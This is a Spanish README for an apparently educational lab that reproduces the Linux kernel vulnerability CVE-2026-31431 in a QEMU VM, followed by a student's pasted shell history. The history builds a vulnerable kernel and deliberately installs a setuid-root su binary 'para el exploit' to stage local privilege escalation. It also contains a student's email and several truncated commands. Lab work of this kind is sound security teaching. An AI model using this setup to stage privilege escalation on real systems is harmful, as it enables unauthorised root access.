# Copy Fail Lab — CVE-2026-31431 (v2)

Devcontainer reproducible para experimentar con la vulnerabilidad **Copy Fail**
(CVE-2026-31431) en un kernel Linux 6.12 controlado dentro de QEMU.

Esta v2 incorpora todas las correcciones aprendidas en una sesión de debugging
exhaustiva: opciones de kernel necesarias para que arranque, configuración
correcta de BusyBox estático, rutas dinámicas independientes del nombre del repo,
y dependencias Ubuntu 24.04 corregidas.

---

## Inicio rápido para el estudiante

1. Abre un Codespace desde este repo.
2. Configura tu identidad git:
   ```bash
   git config --global user.name "Tu Nombre"
   git config --global user.email "tu@correo.com"
   ```
3. Ejecuta:
   ```bash
   make setup    # descarga kernel + arma rootfs (~5 min)
   make qemu     # arranca la VM vulnerable
   ```

Para salir de QEMU: `Ctrl+A` luego `X`.

---

## Configuración inicial del docente (una sola vez)

### 1. Subir este repo a GitHub

```bash
cd copyfail-v2
git init && git add -A && git commit -m "initial"
git branch -M main
gh repo create TU-ORG/copy-fail-lab --public --source=. --push
```

### 2. Marcarlo como Template

GitHub → tu repo → Settings → marcar `Template repository`.

### 3. Editar `.devcontainer/devcontainer.json`

Cambia el valor `KERNEL_REPO`:
```json
"KERNEL_REPO": "TU-ORG/copy-fail-lab"
```

Commit y push.

### 4. Disparar el workflow del kernel

GitHub → Actions → `Build Vulnerable Kernel` → Run workflow.
Tarda ~25 min en los servidores de GitHub (no en tu Codespace).
Al terminar crea un Release con el `bzImage_vuln` listo para descarga.

### 5. Verificar

Tu repo → Releases → debe aparecer `kernel-v6.12-vuln` con tres archivos
adjuntos. Los estudiantes ahora pueden hacer `make setup` y descarga en 2 min.

---

## Estructura del repo

```
.
├── .devcontainer/
│   ├── Dockerfile             ← Ubuntu 24.04 + deps verificadas
│   └── devcontainer.json      ← sin rutas hardcodeadas
├── .github/workflows/
│   └── build-kernel.yml       ← compila kernel y crea Release
├── scripts/
│   ├── 00_welcome.sh
│   ├── 01_fetch_kernel.sh     ← descarga del Release
│   ├── 02_build_kernel.sh     ← fallback: compila desde fuente
│   ├── 03_build_rootfs.sh     ← BusyBox estático + initramfs
│   └── 04_run_qemu.sh
├── Makefile
└── README.md
```

---

## Comandos disponibles

| Comando | Acción |
|---|---|
| `make setup` | Descarga kernel + arma rootfs (~5 min) |
| `make qemu` | Arranca la VM vulnerable |
| `make info` | Muestra el estado del ambiente |
| `make rootfs` | Reconstruye solo el initramfs |
| `make fetch-kernel` | Solo descarga el bzImage del Release |
| `make build-kernel` | Compila kernel desde fuente (~25 min) |
| `make clean` | Borra builds (mantiene fuentes) |
| `make clean-all` | Borra todo |

---

## Recursos del CVE

- Write-up técnico: https://xint.io/blog/copy-fail-linux-distributions
- Sitio del CVE: https://copy.fail
- PoC oficial: https://github.com/theori-io/copy-fail-CVE-2026-31431

---

## Lecciones aprendidas (referencia para futuras versiones)

Esta v2 incorpora los siguientes fixes respecto a la v1:

- `hexdump` → `bsdextrautils` en Ubuntu 24.04
- `bzip2` agregado al Dockerfile (lo necesita BusyBox)
- Eliminado el `mounts` con ruta hardcodeada en `devcontainer.json`
- Todos los scripts detectan workspace con `SCRIPT_DIR` dinámico
- Kernel: agregadas opciones críticas `BINFMT_ELF`, `BINFMT_SCRIPT`, `RD_GZIP`
- Kernel: agregada dep `CRYPTO_AEAD` antes de `CRYPTO_AUTHENCESN`
- BusyBox: reemplazado `scripts/config` (no existe) por `sed`
- BusyBox: eliminado `olddefconfig` (no existe en BusyBox)
- BusyBox: deshabilitado `CONFIG_TC` (rompe compilación con kernels nuevos)
- BusyBox: forzado `CONFIG_STATIC=y` y verificado con `file`
- Workflow Actions: greps de verificación con `|| echo`, tolerantes


history
 1  git config --global user.name "ales231"
    2  git config --global user.email "alalbanto@uide.edu.ec"
    3  make setup
    4  make qemu
    5  make setup
    6  apt install -y file
    7  apt-get update
    8  git config --global user.name "ales231"
    9  git config --global user.email "alalbanto@uide.edu.ec"
   10  git config --global user.name
   11  git config --global user.email
   12  apt-get install -y file libmagic1
   13  command -v file
   14  file --version
   15  make setup
   16  apt-get install -y file libmagic1
   17  command -v file
   18  file --version
   19  make setup
   20  ls /
   21  lsmod
   22  mkdir -p evidence patches
   23  {   echo "=== SETUP COMPLETADO SIN QEMU ===";   echo "Fecha: $(date)";   echo "Repositorio: $(pwd)";   echo "STUDENT_ID: $(git config --global user.name)";   echo "Email Git: $(git config --global user.email)";   echo "";   echo "=== Archivos generados ===";   ls -lh kernel/build/initramfs.cpio.gz 2>/dev/null || echo "No se encontró initramfs";   ls -lh kernel/build 2>/dev/null | head -20;   echo "";   echo "=== Estado Git ===";   git status --short; } > evidence/setup_completed_host.txt
   24  cat evidence/setup_completed_host.txt
   25  git status
   26  find . -maxdepth 4 -type f -name "*.py" -print
   27  find . -maxdepth 4 -type f | sort
   28  grep -RIn "python3\|python \|verify\|grade\|hito\|qemu\|patched\|copy_fail" README.md Makefile scripts .github 2>/dev/null
   29  make help 2>/dev/null || cat Makefile
   30  make info
   31  echo "=== ARCHIVOS DEL RETO ==="
   32  find . -maxdepth 3 -type f | sort
   33  echo ""
   34  echo "=== OBJETIVOS DEL MAKEFILE ==="
   35  grep -n "^[a-zA-Z0-9_-]*:" Makefile
   36  echo ""
   37  echo "=== SCRIPTS DISPONIBLES ==="
   38  ls -la scripts
   39  history

   git config user.name "ales231"
    2  git config user.email "alalbanto@uide.edu.ec"
    3  git config user.name
    4  git config user.email
    5  grep -R "qemu-system" -n .
    6  nano scripts/04_run_qemu.sh
    7  code scripts/04_run_qemu.sh
    8  bash -n scripts/04_run_qemu.sh
    9  make qemu
   10  make setup
   11  apt update
   12  apt install -y file
   13  make setup
   14  make qemu
   15  make setup
   16  make qemu
   17  make setup
   18  male qemu
   19  make qemu
   20  code scripts/03_build_rootfs.sh
   21  make setup
   22  make qemu
   23  rm -f kernel/build/initramfs.cpio.gz
   24  make setup
   25  make qemu
   26  grep -E "CONFIG_MODULES|CONFIG_CRYPTO_USER_API|CONFIG_CRYPTO_USER_API_AEAD|CONFIG_CRYPTO_AUTHENC|CONFIG_AF_ALG|CONFIG_VIRTIO_NET|CONFIGg
   27  clean
   28  grep -E "CONFIG_MODULES|CONFIG_CRYPTO_USER_API|CONFIG_CRYPTO_USER_API_AEAD|CONFIG_CRYPTO_AUTHENC|CONFIG_AF_ALG|CONFIG_VIRTIO_NET|CONFIGg
   29  pwd
   30  ls -la kernel
   31  find kernel -maxdepth 4 -type f -name ".config" -print
   32  find kernel -maxdepth 4 -type d -name "linux*" -print
   33  find kernel -maxdepth 4 -type d -print
   34  find kernel -maxdepth 5 -type f | head -80
   35  ls -lh kernel/build
   36  find . -type f -name ".config" -print
   37  sed -n '1,220p' scripts/01_fetch_kernel.sh
   38  sed -n '1,260p' scripts/02_build_kernel.sh
   39  grep -R "bzImage_vuln\|linux\|CONFIG_MODULES\|CRYPTO_USER_API\|ALGIF\|AEAD\|AUTHENC" -n scripts Makefile .github 2>/dev/null
   40  echo "$KERNEL_REPO"
   41  echo "${KERNEL_RELEASE_TAG:-kernel-v6.12-vuln}"
   42  curl -fL -o kernel/build/kernel.config "https://github.com/${KERNEL_REPO}/releases/download/${KERNEL_RELEASE_TAG:-kernel-v6.12-vuln}/ke"
   43  grep -E "CONFIG_MODULES|CONFIG_CRYPTO_USER_API|CONFIG_CRYPTO_USER_API_AEAD|CONFIG_CRYPTO_AUTHENCESN" kernel/build/kernel.config
   44  mkdir -p evidence
   45  cat > evidence/hito1_vuln_confirmed.txt <<'EOF'
=== HITO 1: KERNEL VULNERABLE CONFIRMADO ===

Evidencia obtenida dentro de QEMU:

Hostname: copy-fail-ales231
Kernel: 6.12.0
Identidad: uid=1001(student) gid=1001(student) groups=1001(student)
Usuario: student

Verificación de configuración del kernel:
# CONFIG_MODULES is not set
CONFIG_CRYPTO_USER_API=y
CONFIG_CRYPTO_USER_API_AEAD=y
CONFIG_CRYPTO_USER_API_SKCIPHER=y

Nota técnica:
En esta imagen del kernel, /proc/modules no existe porque CONFIG_MODULES no está habilitado.
AF_ALG/AEAD sí está disponible como built-in porque CONFIG_CRYPTO_USER_API=y y CONFIG_CRYPTO_USER_API_AEAD=y.
Por eso no aparece algif_aead en lsmod, ya que no fue compilado como módulo .ko.
EOF

   46  cat evidence/hito1_vuln_confirmed.txt
   47  git add evidence/hito1_vuln_confirmed.txt
   48  git commit -m "hito-1: kernel vulnerable confirmado - $(date +%Y-%m-%dT%H:%M)"
   49  git tag -a hito-1 -m "Kernel vulnerable corriendo, AF_ALG/AEAD confirmado"
   50  git push origin main --tags
   51  make qemu
   52  code scripts/02_build_kernel.sh
   53  # 1) Guardar por si acaso
   54  git diff scripts/02_build_kernel.sh
   55  # 2) Borrar el kernel viejo precompilado para obligar a recompilar
   56  rm -f kernel/build/bzImage_vuln
   57  # 3) Compilar el kernel desde fuente con FUTEX agregado
   58  bash scripts/02_build_kernel.sh
   59  grep -E "CONFIG_FUTEX|CONFIG_EPOLL|CONFIG_EVENTFD|CONFIG_SIGNALFD|CONFIG_TIMERFD|CONFIG_CRYPTO_AUTHENCESN|CONFIG_CRYPTO_USER_API_AEAD" g
   60  grep -R "config CRYPTO_AUTHENCESN" -n kernel/linux/crypto kernel/linux/net 2>/dev/null
   61  grep -RniE "authencesn|authenc.*esn|AUTHENC|ESN" kernel/linux | head -80
   62  find kernel/linux -type f | grep -i "authenc"
   63  grep -E "CONFIG_CRYPTO_AEAD|CONFIG_CRYPTO_AUTHENC|CONFIG_CRYPTO_AUTHENCESN|CONFIG_CRYPTO_USER_API_AEAD|CONFIG_CRYPTO_NULL|CONFIG_CRYPTOg
   64  rm -f kernel/build/initramfs.cpio.gz
   65  bash scripts/03_build_rootfs.sh
   66  make qemu
   67  code scripts/03_build_rootfs.sh
   68  rm -f kernel/build/initramfs.cpio.gz
   69  bash scripts/03_build_rootfs.sh
   70  make qemu
   71  code scripts/02_build_kernel.sh
   72  rm -f kernel/build/bzImage_vuln
   73  bash scripts/02_build_kernel.sh
   74  grep -E "CONFIG_PCI|CONFIG_NETDEVICES|CONFIG_PACKET|CONFIG_VIRTIO|CONFIG_VIRTIO_PCI|CONFIG_VIRTIO_NET" kernel/linux/.config
   75  rm -f kernel/build/initramfs.cpio.gz
   76  bash scripts/03_build_rootfs.sh
   77  make qemu
   78  code scripts/03_build_rootfs.sh
   79  rm -f kernel/build/initramfs.cpio.gz
   80  bash scripts/03_build_rootfs.sh
   81  make qemu
   82  ROOTFS=/tmp/cf-rootfs
   83  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
   84  rm -rf "$ROOTFS"
   85  mkdir -p "$ROOTFS"
   86  cd "$ROOTFS"
   87  gzip -dc "$INITRAMFS" | cpio -idmv >/dev/null 2>&1
   88  PYBIN="$(command -v python3)"
   89  PYVER="$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')"
   90  mkdir -p "$ROOTFS/usr/bin"
   91  cp -L "$PYBIN" "$ROOTFS/usr/bin/python3"
   92  ln -sf python3 "$ROOTFS/usr/bin/python"
   93  copy_deps() {   ldd "$1" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i ~ /^\//) print $i}' | while read -r lib; do     mkdir -p "$ROOTF}
   94  copy_deps "$PYBIN"
   95  for d in "/usr/lib/python$PYVER" "/usr/local/lib/python$PYVER"; do   if [ -d "$d" ]; then     mkdir -p "$ROOTFS$(dirname "$d")";     cpe
   96  for lib in /usr/lib/x86_64-linux-gnu/libpython${PYVER}*.so* /usr/local/lib/libpython${PYVER}*.so*; do   if [ -e "$lib" ]; then     mkdie
   97  find "$ROOTFS" -type f -name "*.so*" | while read -r sofile; do   copy_deps "$sofile"; done
   98  find "$ROOTFS" -type d -name "__pycache__" -prune -exec rm -rf {} + 2>/dev/null || true
   99  cd "$ROOTFS"
  100  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  101  cd - >/dev/null
  102  echo "Python agregado al initramfs:"
  103  ls -lh "$INITRAMFS"
  104  make qemu
  105  cd /workspaces/copy-fail-challenge-B-ok
  106  make qemu~
  107  cd /workspaces/copy-fail-challenge-B-ok
  108  make qemu
  109  cd /workspaces/copy-fail-challenge-B-ok
  110  ROOTFS=/tmp/cf-rootfs
  111  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  112  # Arreglar permisos básicos para que student pueda entrar
  113  chmod 755 "$ROOTFS"
  114  chmod 755 "$ROOTFS/home" 2>/dev/null || true
  115  chmod 755 "$ROOTFS/home/student" 2>/dev/null || true
  116  chown -R 1001:1001 "$ROOTFS/home/student" 2>/dev/null || true
  117  # Arreglar permisos de directorios principales
  118  chmod 755 "$ROOTFS/bin" "$ROOTFS/sbin" "$ROOTFS/usr" "$ROOTFS/usr/bin" "$ROOTFS/etc" 2>/dev/null || true
  119  chmod 755 "$ROOTFS/proc" "$ROOTFS/sys" "$ROOTFS/dev" 2>/dev/null || true
  120  # Asegurar que init sea ejecutable
  121  chmod +x "$ROOTFS/init"
  122  # Verificar permisos importantes
  123  ls -ld "$ROOTFS" "$ROOTFS/home" "$ROOTFS/home/student" "$ROOTFS/init"
  124  cd "$ROOTFS"
  125  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  126  cd /workspaces/copy-fail-challenge-B-ok
  127  ls -lh kernel/build/initramfs.cpio.gz
  128  make qemu
  129  ROOTFS=/tmp/cf-rootfs
  130  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  131  # Si el rootfs temporal no existe, lo volvemos a extraer
  132  if [ ! -d "$ROOTFS" ]; then   mkdir -p "$ROOTFS";   cd "$ROOTFS";   gzip -dc "$INITRAMFS" | cpio -idmv >/dev/null 2>&1;   cd /workspacei
  133  # Permisos básicos
  134  chmod 755 "$ROOTFS"
  135  chmod 755 "$ROOTFS/usr" "$ROOTFS/usr/bin" 2>/dev/null || true
  136  chmod 755 "$ROOTFS/bin" "$ROOTFS/sbin" "$ROOTFS/lib" "$ROOTFS/lib64" 2>/dev/null || true
  137  chmod 755 "$ROOTFS/home" "$ROOTFS/home/student" 2>/dev/null || true
  138  chown -R 1001:1001 "$ROOTFS/home/student" 2>/dev/null || true
  139  # Dar permiso de ejecución a Python
  140  chmod 755 "$ROOTFS/usr/bin/python3" 2>/dev/null || true
  141  chmod 755 "$ROOTFS/usr/bin/python" 2>/dev/null || true
  142  # Dar permiso de ejecución al loader dinámico y librerías importantes
  143  find "$ROOTFS/lib" "$ROOTFS/lib64" "$ROOTFS/usr/lib" "$ROOTFS/usr/local/lib"   -type f \( -name "ld-linux*" -o -name "*.so*" \)   -exece
  144  # Verificación
  145  ls -l "$ROOTFS/usr/bin/python3" "$ROOTFS/usr/bin/python" 2>/dev/null || true
  146  find "$ROOTFS" -name "ld-linux*" -exec ls -l {} \; 2>/dev/null || true
  147  # Reempacar initramfs
  148  cd "$ROOTFS"
  149  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  150  cd /workspaces/copy-fail-challenge-B-ok
  151  ls -lh kernel/build/initramfs.cpio.gz
  152  make qemu
  153  cd /workspaces/copy-fail-challenge-B-ok
  154  ROOTFS=/tmp/cf-rootfs
  155  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  156  # Si el rootfs temporal no existe, extraerlo
  157  if [ ! -d "$ROOTFS" ]; then   rm -rf "$ROOTFS";   mkdir -p "$ROOTFS";   cd "$ROOTFS";   gzip -dc "$INITRAMFS" | cpio -idmv >/dev/null 2i
  158  # Dar permiso de entrada a todos los directorios
  159  find "$ROOTFS" -type d -exec chmod 755 {} \;
  160  # Dar permiso correcto a Python
  161  chmod 755 "$ROOTFS/usr/bin/python3" 2>/dev/null || true
  162  chmod 755 "$ROOTFS/usr/bin/python" 2>/dev/null || true
  163  # Dar permiso correcto a librerías dinámicas
  164  find "$ROOTFS" -type f \( -name "*.so" -o -name "*.so.*" -o -name "ld-linux*" \) -exec chmod 755 {} \;
  165  # Asegurar permisos concretos para libm
  166  find "$ROOTFS" -name "libm.so*" -exec chmod 755 {} \;
  167  find "$ROOTFS" -name "libm.so*" -exec ls -l {} \;
  168  # Mantener home de student accesible
  169  chmod 755 "$ROOTFS/home" 2>/dev/null || true
  170  chmod 755 "$ROOTFS/home/student" 2>/dev/null || true
  171  chown -R 1001:1001 "$ROOTFS/home/student" 2>/dev/null || true
  172  # Asegurar init ejecutable
  173  chmod 755 "$ROOTFS/init"
  174  # Reempacar initramfs
  175  cd "$ROOTFS"
  176  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  177  cd /workspaces/copy-fail-challenge-B-ok
  178  ls -lh kernel/build/initramfs.cpio.gz
  179  make qemu
  180  cd /workspaces/copy-fail-challenge-B-ok
  181  ROOTFS=/tmp/cf-rootfs
  182  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  183  # Asegurar carpeta
  184  mkdir -p "$ROOTFS/usr/bin"
  185  # Crear /usr/bin/su como binario real, NO symlink
  186  cp -L "$ROOTFS/bin/busybox" "$ROOTFS/usr/bin/su"
  187  # Permisos root + setuid
  188  chown root:root "$ROOTFS/usr/bin/su"
  189  chmod 4755 "$ROOTFS/usr/bin/su"
  190  # Verificar
  191  ls -l "$ROOTFS/usr/bin/su"
  192  file "$ROOTFS/usr/bin/su"
  193  # Reempacar initramfs sin perder Python
  194  cd "$ROOTFS"
  195  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  196  cd /workspaces/copy-fail-challenge-B-ok
  197  ls -lh kernel/build/initramfs.cpio.gz
  198  make qemu
  199  cd /workspaces/copy-fail-challenge-B-ok
  200  ROOTFS=/tmp/cf-rootfs
  201  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  202  # Si no existe el rootfs temporal, extraerlo
  203  if [ ! -d "$ROOTFS" ]; then   rm -rf "$ROOTFS";   mkdir -p "$ROOTFS";   cd "$ROOTFS";   gzip -dc "$INITRAMFS" | cpio -idmv >/dev/null 2i
  204  # Buscar el su real del host
  205  SUBIN="$(command -v su)"
  206  echo "SU del host: $SUBIN"
  207  # Reemplazar /usr/bin/su por el su real, no BusyBox
  208  mkdir -p "$ROOTFS/usr/bin"
  209  rm -f "$ROOTFS/usr/bin/su"
  210  cp -L "$SUBIN" "$ROOTFS/usr/bin/su"
  211  # Copiar dependencias dinámicas de su
  212  ldd "$SUBIN" | awk '{for(i=1;i<=NF;i++) if ($i ~ /^\//) print $i}' | while read -r lib; do   mkdir -p "$ROOTFS$(dirname "$lib")";   cp e
  213  # Copiar PAM/configs si existen
  214  mkdir -p "$ROOTFS/etc/pam.d" "$ROOTFS/etc/security"
  215  cp -a /etc/pam.d/su "$ROOTFS/etc/pam.d/su" 2>/dev/null || true
  216  cp -a /etc/login.defs "$ROOTFS/etc/login.defs" 2>/dev/null || true
  217  cp -a /etc/security/* "$ROOTFS/etc/security/" 2>/dev/null || true
  218  # Permisos correctos: setuid-root
  219  chown root:root "$ROOTFS/usr/bin/su"
  220  chmod 4755 "$ROOTFS/usr/bin/su"
  221  # Permisos generales
  222  find "$ROOTFS" -type d -exec chmod 755 {} \;
  223  chmod 755 "$ROOTFS/init"
  224  chmod 755 "$ROOTFS/usr/bin/python3" 2>/dev/null || true
  225  find "$ROOTFS" -type f \( -name "*.so" -o -name "*.so.*" -o -name "ld-linux*" \) -exec chmod 755 {} \;
  226  # Verificar antes de empacar
  227  ls -l "$ROOTFS/usr/bin/su"
  228  file "$ROOTFS/usr/bin/su"
  229  ldd "$ROOTFS/usr/bin/su" 2>/dev/null || true
  230  # Reempacar initramfs
  231  cd "$ROOTFS"
  232  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  233  cd /workspaces/copy-fail-challenge-B-ok
  234  ls -lh kernel/build/initramfs.cpio.gz
  235  make qemu
  236  cd /workspaces/copy-fail-challenge-B-ok
  237  ROOTFS=/tmp/cf-rootfs
  238  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  239  rm -f "$ROOTFS/bin/su"
  240  ln -s /usr/bin/su "$ROOTFS/bin/su"
  241  ls -l "$ROOTFS/bin/su" "$ROOTFS/usr/bin/su"
  242  cd "$ROOTFS"
  243  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  244  cd /workspaces/copy-fail-challenge-B-ok
  245  make qemu
  246  cd /workspaces/copy-fail-challenge-B-ok
  247  cat > /tmp/repair_cf_initramfs.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

cd /workspaces/copy-fail-challenge-B-ok

ROOTFS=/tmp/cf-rootfs
INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"

echo "[1] Regenerando initramfs base..."
rm -f "$INITRAMFS"
bash scripts/03_build_rootfs.sh

echo "[2] Extrayendo initramfs..."
rm -rf "$ROOTFS"
mkdir -p "$ROOTFS"
cd "$ROOTFS"
gzip -dc "$INITRAMFS" | cpio -idmv >/dev/null 2>&1
cd /workspaces/copy-fail-challenge-B-ok

copy_deps() {
  local bin="$1"
  ldd "$bin" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i ~ /^\//) print $i}' | while read -r lib; do
    mkdir -p "$ROOTFS$(dirname "$lib")"
    cp -L "$lib" "$ROOTFS$lib"
  done
}

echo "[3] Agregando Python3..."
PYBIN="$(command -v python3)"
PYVER="$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')"

mkdir -p "$ROOTFS/usr/bin"
cp -L "$PYBIN" "$ROOTFS/usr/bin/python3"
chmod 755 "$ROOTFS/usr/bin/python3"
ln -sf python3 "$ROOTFS/usr/bin/python"

copy_deps "$PYBIN"

for d in "/usr/lib/python$PYVER" "/usr/local/lib/python$PYVER"; do
  if [ -d "$d" ]; then
    mkdir -p "$ROOTFS$(dirname "$d")"
    cp -a "$d" "$ROOTFS$(dirname "$d")/"
  fi
done

for lib in /usr/lib/x86_64-linux-gnu/libpython${PYVER}*.so* /usr/local/lib/libpython${PYVER}*.so*; do
  if [ -e "$lib" ]; then
    mkdir -p "$ROOTFS$(dirname "$lib")"
    cp -L "$lib" "$ROOTFS$lib"
  fi
done

echo "[4] Agregando /usr/bin/su real con SUID..."
SUBIN="$(command -v su)"

mkdir -p "$ROOTFS/usr/bin"
rm -f "$ROOTFS/usr/bin/su"
cp -L "$SUBIN" "$ROOTFS/usr/bin/su"
chown root:root "$ROOTFS/usr/bin/su"
chmod 4755 "$ROOTFS/usr/bin/su"

copy_deps "$SUBIN"

# Configs y módulos PAM por si el su real los necesita
mkdir -p "$ROOTFS/etc/pam.d" "$ROOTFS/etc/security" "$ROOTFS/lib/x86_64-linux-gnu"
cp -a /etc/pam.d/su "$ROOTFS/etc/pam.d/su" 2>/dev/null || true
cp -a /etc/pam.d/common-* "$ROOTFS/etc/pam.d/" 2>/dev/null || true
cp -a /etc/login.defs "$ROOTFS/etc/login.defs" 2>/dev/null || true
cp -a /etc/security/* "$ROOTFS/etc/security/" 2>/dev/null || true
cp -a /lib/x86_64-linux-gnu/security "$ROOTFS/lib/x86_64-linux-gnu/" 2>/dev/null || true

# Mantener /bin/su como estaba para que el arranque no se rompa
ln -sf busybox "$ROOTFS/bin/su"

echo "[5] Asegurando red antes de entrar como student..."
if ! grep -q "QEMU user-mode NAT auto" "$ROOTFS/init"; then
  tmpfile="$(mktemp)"
  awk '
    /exec \/bin\/su - student/ {
      print "export PATH=/usr/bin:/bin:/sbin:/usr/sbin"
      print "# QEMU user-mode NAT auto"
      print "/bin/busybox ifconfig lo 127.0.0.1 up 2>/dev/null || true"
      print "/bin/busybox ifconfig eth0 10.0.2.15 netmask 255.255.255.0 up 2>/dev/null || true"
      print "/bin/busybox route add default gw 10.0.2.2 2>/dev/null || true"
      print "mkdir -p /etc"
      print "echo nameserver 10.0.2.3 > /etc/resolv.conf"
      print "echo nameserver 8.8.8.8 >> /etc/resolv.conf"
    }
    { print }
  ' "$ROOTFS/init" > "$tmpfile"
  cat "$tmpfile" > "$ROOTFS/init"
  rm -f "$tmpfile"
fi

echo "[6] Corrigiendo permisos..."
find "$ROOTFS" -type d -exec chmod 755 {} \;

chmod 755 "$ROOTFS/init"
chmod 755 "$ROOTFS/usr/bin/python3" 2>/dev/null || true
chmod 4755 "$ROOTFS/usr/bin/su"
chown root:root "$ROOTFS/usr/bin/su"

find "$ROOTFS" -type f \( -name "*.so" -o -name "*.so.*" -o -name "ld-linux*" \) -exec chmod 755 {} \;

chmod 755 "$ROOTFS/home" 2>/dev/null || true
chmod 755 "$ROOTFS/home/student" 2>/dev/null || true
chown -R 1001:1001 "$ROOTFS/home/student" 2>/dev/null || true

echo "[7] Verificación antes de empacar:"
ls -l "$ROOTFS/init"
ls -l "$ROOTFS/usr/bin/python3"
ls -l "$ROOTFS/usr/bin/su"
ls -l "$ROOTFS/bin/su"

echo "[8] Reempacando initramfs..."
cd "$ROOTFS"
find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"

cd /workspaces/copy-fail-challenge-B-ok
echo "Initramfs listo:"
ls -lh "$INITRAMFS"
EOF

  248  bash /tmp/repair_cf_initramfs.sh
  249  make qemu
  250  cd /workspaces/copy-fail-challenge-B-ok
  251  ROOTFS=/tmp/cf-rootfs
  252  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  253  # Hacer que /bin/su apunte al su real
  254  rm -f "$ROOTFS/bin/su"
  255  ln -s /usr/bin/su "$ROOTFS/bin/su"
  256  # Asegurar permisos SUID del su real
  257  chown root:root "$ROOTFS/usr/bin/su"
  258  chmod 4755 "$ROOTFS/usr/bin/su"
  259  # Cambiar el init para entrar como student usando el su real
  260  sed -i 's#exec /bin/su - student#exec /usr/bin/su - student#' "$ROOTFS/init"
  261  # Verificar
  262  ls -l "$ROOTFS/bin/su" "$ROOTFS/usr/bin/su"
  263  grep -n "su - student" "$ROOTFS/init"
  264  # Reempacar initramfs
  265  cd "$ROOTFS"
  266  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  267  cd /workspaces/copy-fail-challenge-B-ok
  268  ls -lh kernel/build/initramfs.cpio.gz
  269  make qemu
  270  cd /workspaces/copy-fail-challenge-B-ok
  271  ROOTFS=/tmp/cf-rootfs
  272  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  273  # Restaurar /bin/su como BusyBox para que el arranque no haga panic
  274  rm -f "$ROOTFS/bin/su"
  275  ln -s busybox "$ROOTFS/bin/su"
  276  # Restaurar el init para que entre como student usando BusyBox su
  277  sed -i 's#exec /usr/bin/su - student#exec /bin/su - student#g' "$ROOTFS/init"
  278  # Mantener /usr/bin/su real y SUID para el exploit
  279  chown root:root "$ROOTFS/usr/bin/su"
  280  chmod 4755 "$ROOTFS/usr/bin/su"
  281  # Verificar
  282  ls -l "$ROOTFS/bin/su" "$ROOTFS/usr/bin/su"
  283  grep -n "su - student" "$ROOTFS/init"
  284  # Reempacar initramfs
  285  cd "$ROOTFS"
  286  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  287  cd /workspaces/copy-fail-challenge-B-ok
  288  ls -lh kernel/build/initramfs.cpio.gz
  289  make qemu
  290  cd /workspaces/copy-fail-challenge-B-ok
  291  ROOTFS=/tmp/cf-rootfs
  292  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  293  # 1) Que /bin/su apunte al su real
  294  rm -f "$ROOTFS/bin/su"
  295  ln -s /usr/bin/su "$ROOTFS/bin/su"
  296  # 2) Pero el arranque debe usar BusyBox directo para evitar kernel panic
  297  sed -i 's#exec /bin/su - student#exec /bin/busybox su - student#g' "$ROOTFS/init"
  298  sed -i 's#exec /usr/bin/su - student#exec /bin/busybox su - student#g' "$ROOTFS/init"
  299  # 3) Asegurar que /usr/bin/su sea SUID root
  300  chown root:root "$ROOTFS/usr/bin/su"
  301  chmod 4755 "$ROOTFS/usr/bin/su"
  302  # 4) Verificar
  303  ls -l "$ROOTFS/bin/su" "$ROOTFS/usr/bin/su"
  304  grep -n "student" "$ROOTFS/init"
  305  # 5) Reempacar
  306  cd "$ROOTFS"
  307  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  308  cd /workspaces/copy-fail-challenge-B-ok
  309  ls -lh kernel/build/initramfs.cpio.gz
  310  make qemu
  311  cd /workspaces/copy-fail-challenge-B-ok
  312  ROOTFS=/tmp/cf-rootfs
  313  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  314  # El init NO debe usar /bin/su, porque vamos a cambiar /bin/su
  315  # Debe usar BusyBox directamente para entrar como student
  316  sed -i 's#exec /bin/su - student#exec /bin/busybox su - student#g' "$ROOTFS/init"
  317  sed -i 's#exec /usr/bin/su - student#exec /bin/busybox su - student#g' "$ROOTFS/init"
  318  # Ahora sí: que /bin/su apunte al su real
  319  rm -f "$ROOTFS/bin/su"
  320  ln -s /usr/bin/su "$ROOTFS/bin/su"
  321  # Asegurar que /usr/bin/su sea el su real y SUID root
  322  chown root:root "$ROOTFS/usr/bin/su"
  323  chmod 4755 "$ROOTFS/usr/bin/su"
  324  # Verificación antes de empacar
  325  echo "=== INIT ==="
  326  grep -n "student" "$ROOTFS/init"
  327  echo "=== SU ==="
  328  ls -l "$ROOTFS/bin/su" "$ROOTFS/usr/bin/su"
  329  cd "$ROOTFS"
  330  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  331  cd /workspaces/copy-fail-challenge-B-ok
  332  ls -lh kernel/build/initramfs.cpio.gz
  333  make qemu
